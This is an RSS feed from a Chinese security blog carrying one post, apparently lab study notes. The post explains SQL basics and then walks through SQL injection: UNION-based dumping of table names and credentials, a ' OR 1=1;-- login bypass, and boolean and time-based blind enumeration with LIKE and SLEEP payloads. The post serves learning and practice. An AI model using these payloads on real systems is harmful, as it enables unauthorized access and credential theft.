@@ -1,0 +1,338 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>SQL注入 on 夜路归</title>
+        <link>https://Yerucrem.github.io/categories/sql%E6%B3%A8%E5%85%A5/</link>
+        <description>Recent content in SQL注入 on 夜路归</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>zh-cn</language>
+        <copyright>Yerucrem</copyright>
+        <lastBuildDate>Tue, 18 Mar 2025 00:00:00 +0000</lastBuildDate><atom:link href="https://Yerucrem.github.io/categories/sql%E6%B3%A8%E5%85%A5/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>SQL注入基础</title>
+        <link>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</link>
+        <pubDate>Tue, 18 Mar 2025 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/sql%E6%B3%A8%E5%85%A5%E5%9F%BA%E7%A1%80/</guid>
+        <description>&lt;img src="https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/73aeab67fb4786d5331bab4f3b2452827dba9d186069cdc60db0ecfab89b34c5.png" alt="Featured image of post SQL注入基础" /&gt;&lt;h1 id=&#34;sql注入&#34;&gt;SQL注入
+&lt;/h1&gt;&lt;p&gt;SQL 语法不区分大小写。&lt;/p&gt;
+&lt;h2 id=&#34;sql基础&#34;&gt;SQL基础
+&lt;/h2&gt;&lt;h3 id=&#34;select&#34;&gt;SELECT
+&lt;/h3&gt;&lt;p&gt;我们将学习的第一种查询类型是用于从数据库中检索数据的 SELECT 查询。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160026857.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;第一个单词 SELECT 告诉数据库我们想要检索一些数据;* 告诉数据库我们想从表中接收所有列。例如，该表可能包含三列（id、username 和 password）。“from users” 告诉数据库我们想要从名为 users 的表中检索数据。最后，末尾的分号告诉数据库这是查询的结束。&lt;/p&gt;
+&lt;p&gt;下一个查询与上述查询类似，但这次，我们不是使用 * 返回数据库表中的所有列，而是只请求 username 和 password 字段。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select username,password from users;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160107670.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;与第一个查询一样，以下查询使用 * 选择器返回所有列，然后 “LIMIT 1” 子句强制数据库仅返回一行数据。将查询更改为 “LIMIT 1,1” 会强制查询跳过第一个结果，然后 “LIMIT 2,1” 会跳过前两个结果，依此类推。您需要记住，第一个数字告诉数据库您希望跳过多少个结果，第二个数字告诉数据库要返回多少行。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users LIMIT 1;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160133299.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160158890.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这只会返回 username 等于 admin 的行。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username != &#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160228981.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这只会返回 username &lt;strong&gt;不&lt;/strong&gt; 等于 admin 的行。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; or username=&#39;jon&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160256822.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这只会返回用户名等于 admin 或 jon 的行。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username=&#39;admin&#39; and password=&#39;p4ssword&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160336441.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这只会返回用户名等于 &lt;strong&gt;admin&lt;/strong&gt; 且密码等于 &lt;strong&gt;p4ssword&lt;/strong&gt; 的行.&lt;/p&gt;
+&lt;h4 id=&#34;like&#34;&gt;like
+&lt;/h4&gt;&lt;p&gt;使用 like 子句允许您指定不完全匹配，而是以特定字符开头、包含或结尾的数据，方法是选择放置由百分号表示的通配符的位置。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%n&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160440356.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这将返回用户名以字母 n 结尾的任何行。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username like &#39;%mi%&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160504321.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这将返回用户名中包含字符 &lt;strong&gt;mi&lt;/strong&gt; 的任何行。&lt;/p&gt;
+&lt;h3 id=&#34;union&#34;&gt;UNION
+&lt;/h3&gt;&lt;p&gt;UNION 语句将两个或多个 SELECT 语句的结果组合在一起，以从单个或多个表中检索数据;此查询的规则是 UNION 语句必须在每个 SELECT 语句中检索相同数量的列，列必须具有相似的数据类型，并且列顺序必须相同。这听起来可能不是很清楚，所以让我们使用下面的类比。假设一家公司想要为所有客户和供应商创建一个地址列表，以便发布新目录。我们有一个名为 customers 的表，其中包含以下内容：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160608318.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;另一个表叫 suppliers，内容如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160630628.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;使用以下 SQL 语句，我们可以从两个表中收集结果并将它们放入一个结果集中：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;SELECT name,address,city,postcode from customers UNION SELECT company,address,city,postcode from suppliers;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160656676.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;insert&#34;&gt;INSERT
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;INSERT&lt;/strong&gt; 语句告诉数据库我们希望在表中插入一行新数据。 &lt;strong&gt;“into users”&lt;/strong&gt; 告诉数据库我们希望将数据插入到哪个表中， &lt;strong&gt;“（username，password）”&lt;/strong&gt; 提供我们提供数据的列，然后 &lt;strong&gt;“values （&amp;lsquo;bob&amp;rsquo;，&amp;lsquo;password&amp;rsquo;）”;&lt;/strong&gt; 提供以前指定的列的数据。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;insert into users (username,password) values (&#39;bob&#39;,&#39;password123&#39;);&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160737067.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;update&#34;&gt;UPDATE
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;UPDATE&lt;/strong&gt; 语句告诉数据库我们希望更新表中的一行或多行数据。您使用 “&lt;strong&gt;update %tablename% SET&lt;/strong&gt;” 指定要更新的表，然后选择要更新的一个或多个字段，以逗号分隔的列表，例如 “&lt;strong&gt;username=&amp;lsquo;root&amp;rsquo;，password=&amp;lsquo;pass123&amp;rsquo;&lt;/strong&gt;”，最后，类似于 SELECT 语句，您可以使用 where 子句准确指定要更新的行，例如 “&lt;strong&gt;where username=&amp;lsquo;admin;&lt;/strong&gt;“&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;update users SET username=&#39;root&#39;,password=&#39;pass123&#39; where username=&#39;admin&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160817369.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;delete&#34;&gt;DELETE
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;DELETE&lt;/strong&gt; 语句告诉数据库我们希望删除一行或多行数据。除了缺少要返回的列之外，此查询的格式与 SELECT 非常相似。您可以使用 &lt;strong&gt;where&lt;/strong&gt; &lt;strong&gt;子句精确&lt;/strong&gt;指定要删除的数据，并使用 LIMIT 子句指定要删除的行 数。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;delete from users where username=&#39;martin&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160846187.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;delete from users;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;由于查询中未使用 WHERE 子句，因此所有数据都已从表中删除。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318160925268.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h2 id=&#34;基础做题&#34;&gt;基础做题
+&lt;/h2&gt;&lt;h3 id=&#34;in-band-sql-injection&#34;&gt;In-Band SQL Injection
+&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163151079.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h4 id=&#34;查询库&#34;&gt;查询库
+&lt;/h4&gt;&lt;p&gt;利用union查询的原理，先确定回显的位置。&lt;/p&gt;
+&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,3&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;可以看到页面情况，有三个回显位置&lt;/p&gt;
+&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,database()&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318162957019.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;可以知道database的名字：sqli_one&lt;/p&gt;
+&lt;h4 id=&#34;查询表&#34;&gt;查询表
+&lt;/h4&gt;&lt;p&gt;构建 &lt;code&gt;0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = &#39;sqli_one&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在此查询中，需要学习一些新内容。首先，方法 &lt;strong&gt;group_concat（）&lt;/strong&gt; 从多个返回的行中获取指定的列（在我们的例子中为 table_name），并将其放入一个以逗号分隔的字符串中。接下来是 &lt;strong&gt;information_schema&lt;/strong&gt; 数据库;数据库的每个用户都可以访问它，它包含有关该用户有权访问的所有数据库和表的信息。在这个特定的查询中，我们有兴趣列出 sqli_one 数据库中的所有 表，即 article 和 staff_users。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163513022.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;由于第一级旨在发现 Martin 的密码，因此 staff_users 表是我们感兴趣的。我们可以再次利用 information_schema 数据库，通过以下查询找到此表的结构。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = &#39;staff_users&#39;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318163803767.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;这与前面的 SQL 查询类似。但是，我们要检索的信息已从 table_name 更改为 &lt;strong&gt;column_name&lt;/strong&gt;，我们在 information_schema 数据库中查询的表已从 tables 更改为 &lt;strong&gt;columns&lt;/strong&gt;，并且我们正在搜索 table_name 列值为 staff_users 的任何行&lt;/p&gt;
+&lt;p&gt;查询结果为 staff_users 表提供三列：id、password 和 username。我们可以使用以下查询的 username 和 password 列来检索用户的信息。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;0 UNION SELECT 1,2,group_concat(username,&#39;:&#39;,password SEPARATOR &#39;&amp;lt;br&amp;gt;&#39;) FROM staff_users&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;同样，我们使用 group_concat 方法将所有行返回到一个字符串中，使其 更易于阅读。我们还添加了 &lt;strong&gt;，&amp;rsquo;：&amp;rsquo;，&lt;/strong&gt; 以将用户名和密码彼此分开。我们没有用逗号分隔，而是选择了 &lt;code&gt;HTML &amp;lt;br&amp;gt;&lt;/code&gt; 标签，该标签强制每个结果位于单独的行上，以便于阅读。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164023522.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;身份认证绕过盲注&#34;&gt;身份认证绕过盲注
+&lt;/h3&gt;&lt;p&gt;与带内 SQL 注入不同，我们可以直接在屏幕上看到攻击的结果，而盲 SQLi 是指我们几乎没有收到反馈来确认我们注入的查询是否真的成功，这是因为错误消息已被禁用，但无论如何注入仍然有效。您可能会感到惊讶，我们只需要一点点反馈即可成功枚举整个数据库。&lt;/p&gt;
+&lt;p&gt;最直接的盲 SQL 注入技术之一是绕过身份验证方法，例如登录表单。在这种情况下，我们对从数据库中检索数据并不那么感兴趣;我们只想通过登录。&lt;/p&gt;
+&lt;p&gt;连接到用户数据库的登录表单的开发方式通常使 Web 应用程序对用户名和密码的内容不感兴趣，而更关心两者是否在 users 表中形成匹配的对。简单来说，Web 应用程序会询问数据库，“您有用户名为 bob 的用户，密码为 bob123 吗？ 数据库回答 Yes 或 No （true/false），并且根据该答案，指示 Web 应用程序是否允许您继续。&lt;/p&gt;
+&lt;p&gt;考虑到上述信息，没有必要枚举有效的用户名/密码对。我们只需要创建一个以 yes/true 回复的数据库查询。&lt;/p&gt;
+&lt;h4 id=&#34;实际&#34;&gt;实际：
+&lt;/h4&gt;&lt;p&gt;SQL 注入示例的第二级显示了这个确切的示例。我们可以在标有 “SQL Query” 的框中看到，对数据库的查询如下：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username=&#39;%username%&#39; and password=&#39;%password%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;注意：%username% 和 %password% 值取自登录表单字段。SQL Query （SQL 查询） 框中的初始值将为空，因为这些字段当前为空。&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;要将其转换为始终返回 true 的查询，我们可以在 password 字段中输入以下内容：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;&#39; OR 1=1;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这会将 SQL 查询转换为以下内容：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username=&#39;&#39; and password=&#39;&#39; OR 1=1;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;因为 1=1 是 true 语句，并且我们使用了 &lt;strong&gt;OR&lt;/strong&gt; 运算符，所以这将始终导致查询返回 true，这满足 Web 应用程序逻辑，即数据库找到了有效的用户名/密码组合，并且应该允许访问。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164540872.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;基于布尔盲注&#34;&gt;基于布尔盲注
+&lt;/h3&gt;&lt;p&gt;基于布尔值的 SQL 注入是指我们从注入尝试中收到的响应，可以是 true/false、yes/no、on/off、1/0 或任何只能有两个结果的响应。该结果确认了我们的 SQL Injection payload 成功或失败。在第一次检查时，您可能会觉得这种有限的回答无法提供太多信息。不过，仅通过这两个响应，就可以枚举整个数据库结构和内容。&lt;/p&gt;
+&lt;h4 id=&#34;实际-1&#34;&gt;实际：
+&lt;/h4&gt;&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318164756211.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;览器正文包含 &lt;strong&gt;{“taken”：true}&lt;/strong&gt;。此 API 端点复制了许多订阅表单上的常见功能，该功能检查用户名是否已注册，以提示用户选择不同的用户名。 由于 &lt;strong&gt;taken&lt;/strong&gt; 的值设置为 &lt;strong&gt;true&lt;/strong&gt;，因此我们可以假设用户名 admin 已注册。我们可以通过将模拟浏览器地址栏中的用户名从 &lt;strong&gt;admin&lt;/strong&gt; 更改为 &lt;strong&gt;admin123&lt;/strong&gt; 来确认这一点，按下 Enter 键后，你会看到所采用的值 现在已更改为 false&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;select * from users where username = &#39;%username%&#39; LIMIT 1;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;我们唯一可以控制的输入是查询字符串中的用户名，我们必须使用它来执行 SQL 注入。将用户名保持为 &lt;strong&gt;admin123&lt;/strong&gt;，我们可以开始附加到此内容以尝试使数据库确认 true 内容，将 taken 字段的状态从 false 更改为 true。&lt;/p&gt;
+&lt;p&gt;与前面的级别一样，我们的第一个任务是建立 users&amp;rsquo; 表中的列数，这可以通过使用 UNION 语句来实现。将 username 值更改为以下内容：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1;-- &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;由于 Web 应用程序已使用取为 false 的值 进行响应，因此我们可以确认这是不正确的列值。 继续添加更多列，直到我们得到 &lt;strong&gt;true&lt;/strong&gt; &lt;strong&gt;的 taken&lt;/strong&gt; 值 。您可以通过将 username 设置为以下值来确认答案为三列：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3;-- &lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在我们已经确定了列数，我们可以进行数据库的枚举。我们的第一个任务是发现数据库名称。我们可以通过使用内置的 &lt;strong&gt;database（）&lt;/strong&gt; 方法，然后使用 &lt;strong&gt;like&lt;/strong&gt; 运算符来尝试查找将返回 true 状态的结果。&lt;/p&gt;
+&lt;p&gt;尝试以下 username 值，看看会发生什么：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;%&#39;;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;我们得到一个 true 响应，因为在 like 运算符中，我们只有 % 的值 ，它将匹配任何内容，因为它是通配符值。如果我们将通配符运算符更改为 **a%，**您将看到响应返回 false，这确认数据库名称不以字母 &lt;strong&gt;a&lt;/strong&gt; 开头。我们可以循环遍历所有字母、数字和字符，例如 - 和 _，直到找到匹配项。如果您将以下内容作为 username 值发送，您将收到一个 &lt;strong&gt;true&lt;/strong&gt; 响应，确认数据库名称以字母 &lt;strong&gt;s&lt;/strong&gt; 开头&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 where database() like &#39;s%&#39;;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165301765.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;现在，您继续 数据库名称的下一个字符，直到找到另一个真实的响应，例如，&amp;lsquo;sa%&amp;rsquo;、&amp;lsquo;sb%&amp;rsquo;、&amp;lsquo;sc%&amp;rsquo; 等。继续此过程，直到发现数据库名称的所有字符，即 &lt;strong&gt;sqli_three&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318165348478.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+&lt;p&gt;我们已经建立了数据库名称，现在我们可以通过使用 information_schema 数据库使用类似的方法使用它来枚举表名。尝试将 username 设置为以下值：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name like &#39;a%&#39;;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;此查询在 &lt;strong&gt;tables&lt;/strong&gt; 表中的 information_schema 数据库中 查找数据库名称与 sqli_three 匹配 且表名称以字母 a 开头的结果。 由于上述查询导致 &lt;strong&gt;false&lt;/strong&gt; 响应，我们可以确认 sqli_three 数据库中没有以字母 a 开头的表。和以前一样，您需要在字母、数字和字符之间循环，直到找到正匹配项。&lt;/p&gt;
+&lt;p&gt;您最终会在 sqli_three 数据库中发现一个名为 users 的表，您可以通过运行以下 username payload 来确认该表：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = &#39;sqli_three&#39; and table_name=&#39;users&#39;;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;最后，我们现在需要枚举 users 表中的列名 ，以便我们可以正确地搜索登录凭据。 同样，我们可以使用 information_schema 数据库和我们已经获得的信息来查询它的列名。使用下面的有效负载，我们搜索 columns 表，其中 database 等于 sqli_three，表名称为 users，列名称以字母 a 开头。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;同样， 您需要在字母、数字和字符之间循环，直到找到匹配项。由于您要查找多个结果，因此每次找到新的列名称时，都必须将其添加到有效负载中，以避免发现相同的结果。例如，找到名为 id 的列后，将其附加到原始有效负载中（如下所示）。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA=&#39;sqli_three&#39; and TABLE_NAME=&#39;users&#39; and COLUMN_NAME like &#39;a%&#39; and COLUMN_NAME !=&#39;id&#39;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;重复此过程 3 次，您将发现列的 ID、用户名和密码。现在，您可以使用它来查询 &lt;strong&gt;users&lt;/strong&gt; 表以获取登录凭据。首先，您需要找到一个有效的用户名，您可以使用下面的有效负载：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username like &#39;a%&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT 1,2,3 from users where username=&#39;admin&#39; and password like &#39;a%&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;基于时间的盲注&#34;&gt;基于时间的盲注
+&lt;/h3&gt;&lt;p&gt;基于时间的盲目 SQL 注入与上述基于 布尔值的盲注非常相似，因为发送的请求相同，但这次没有明显的查询是错还是对的指示。相反，正确查询的指标基于查询完成所需的时间。此时间延迟是使用内置方法（如 &lt;strong&gt;SLEEP（x）&lt;/strong&gt; 和 UNION 语句引入的。SLEEP（） 方法只会在成功的 UNION SELECT 语句后执行。&lt;/p&gt;
+&lt;h4 id=&#34;实际-2&#34;&gt;实际：
+&lt;/h4&gt;&lt;p&gt;因此，例如，在尝试建立表中的列数时，您将使用以下查询：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5);--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;如果响应时间没有暂停，则我们知道查询不成功，因此与之前的任务一样，我们添加另一列：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;admin123&#39; UNION SELECT SLEEP(5),2;--&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;有效负载应产生 5 秒的延迟，确认 UNION 语句成功执行，并且有两列。&lt;/p&gt;
+&lt;p&gt;按照布尔盲注的步骤，只是更改一下前面的语句，要改成sleep()形式&lt;/p&gt;
+&lt;p&gt;最后得到admin：4961&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://yerucrembed-1314300122.cos.ap-nanjing.myqcloud.com/img/image-20250318171316143.png&#34;
+	
+	
+	
+	loading=&#34;lazy&#34;
+	
+	
+&gt;&lt;/p&gt;
+</description>
+        </item>
+        
+    </channel>
+</rss>
